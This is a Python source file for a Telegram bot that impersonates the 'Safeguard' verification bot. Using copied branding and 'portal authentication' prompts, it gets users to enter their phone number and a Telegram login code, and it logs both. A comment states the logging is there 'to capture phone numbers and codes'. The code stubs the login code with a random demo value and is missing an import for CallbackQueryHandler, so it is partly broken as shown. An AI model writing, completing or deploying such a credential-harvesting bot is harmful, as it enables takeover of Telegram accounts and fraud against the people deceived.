import os
import logging
import random
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler
from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup

# Set up logging to capture phone numbers and codes
logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# States for the conversation
PHONE, CODE = range(2)

# Start command
def start(update, context):
    # Initial message mimicking the Safeguard bot UI
    welcome_message = (
        "What can this bot do?\n"
        "THE MOST EXTENSIVE SECURITY AND BUY TRACKING PLATFORM ON TELEGRAM\n\n"
        "POWERING @MySafeguardGroup\n"
        "ANNOUNCEMENTS: @MySafeguardBot"
    )
    # Create a "Start" button
    keyboard = [[InlineKeyboardButton("START", callback_data='start_verification')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(welcome_message, reply_markup=reply_markup)
    return ConversationHandler.END

# Handle the "START" button click
def button_callback(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'start_verification':
        # Prompt for verification
        query.message.reply_text(
            "SAFEGUARD PORTAL AUTHENTICATION REQUIRED\n\n"
            "VERIFICATION THROUGH THE SAFEGUARD PORTAL REQUIRED. PLEASE USE THE PORTAL TO COMPLETE YOUR VERIFICATION.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Tap to Verify", callback_data='verify')]])
        )

# Handle the "Tap to Verify" button
def verify_callback(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'verify':
        # Prompt for phone number
        query.message.reply_text(
            "🔒 *MANUAL VERIFICATION*\n"
            "Verify your User Authenticity Below\n"
            "Powered By: @MySafeguardBot\n\n"
            "📱 *Enter PHONE NUMBER:*",
            parse_mode='Markdown',
            reply_markup=ReplyKeyboardRemove()
        )
        return PHONE

# Handle phone number input
def phone(update, context):
    user = update.message.from_user
    phone_number = update.message.text
    context.user_data['phone'] = phone_number

    # Log the phone number
    logger.info(f"User {user.id} entered phone number: {phone_number}")

    # Generate a random 4-digit code (simulating Telegram's code)
    verification_code = str(random.randint(1000, 9999))
    context.user_data['code'] = verification_code

    # Log the generated code
    logger.info(f"Verification code for user {user.id}: {verification_code}")

    # Simulate sending the code via Telegram (in a real scenario, Telegram would send this)
    update.message.reply_text(
        f"🔒 *MANUAL VERIFICATION*\n"
        "Verify your User Authenticity Below\n"
        "Powered By: @MySafeguardBot\n\n"
        "📩 A code has been sent to your Telegram account.\n\n"
        "🔑 *ENTER CODE TELEGRAM CODE:*\n"
        f"(For this demo, the code is: {verification_code})",
        parse_mode='Markdown'
    )
    return CODE

# Handle code input
def code(update, context):
    user = update.message.from_user
    entered_code = update.message.text

    # Log the entered code
    logger.info(f"User {user.id} entered code: {entered_code}")

    correct_code = context.user_data.get('code')
    if entered_code == correct_code:
        # Generate a temporary invite link for the group
        group_id = os.environ.get('GROUP_ID')  # Set this in Render environment variables
        try:
            invite_link = update.message.bot.create_chat_invite_link(
                chat_id=group_id,
                expire_date=int(update.message.date.timestamp()) + 3600,  # Link expires in 1 hour
                member_limit=1  # Single-use link
            ).invite_link
            update.message.reply_text(
                "✅ *Verification successful!*\n\n"
                "You can now join the group using the link below:\n"
                f"{invite_link}",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to generate invite link: {e}")
            update.message.reply_text("Verification successful, but failed to generate the invite link. Please contact the admin.")
    else:
        update.message.reply_text(
            "❌ *Incorrect code. Please try again.*\n\n"
            "🔑 *ENTER CODE TELEGRAM CODE:*",
            parse_mode='Markdown'
        )
        return CODE

    return ConversationHandler.END

# Cancel command
def cancel(update, context):
    update.message.reply_text("Verification cancelled.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

# Error handler
def error(update, context):
    logger.warning(f"Update {update} caused error {context.error}")

def main():
    # Get the bot token from environment variables
    TOKEN = os.environ.get('TOKEN')
    if not TOKEN:
        logger.error("No TOKEN provided. Set the TOKEN environment variable.")
        return

    PORT = int(os.environ.get('PORT', '8443'))
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    # Set up the conversation handler
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            CallbackQueryHandler(button_callback, pattern='start_verification'),
            CallbackQueryHandler(verify_callback, pattern='verify')
        ],
        states={
            PHONE: [MessageHandler(Filters.text & ~Filters.command, phone)],
            CODE: [MessageHandler(Filters.text & ~Filters.command, code)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    dp.add_handler(conv_handler)
    dp.add_error_handler(error)

    # Get the Render hostname or use a placeholder
    hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app-name.onrender.com')
    webhook_url = f"https://{hostname}/{TOKEN}"
    logger.info(f"Setting webhook to: {webhook_url}")

    try:
        # Start the bot using a webhook
        updater.start_webhook(listen="0.0.0.0", port=PORT, url_path=TOKEN, webhook_url=webhook_url)
        logger.info("Webhook set successfully!")
    except Exception as e:
        logger.error(f"Failed to set webhook: {e}")
        logger.info("Falling back to polling...")
        updater.start_polling()

    updater.idle()

if __name__ == '__main__':
    main()
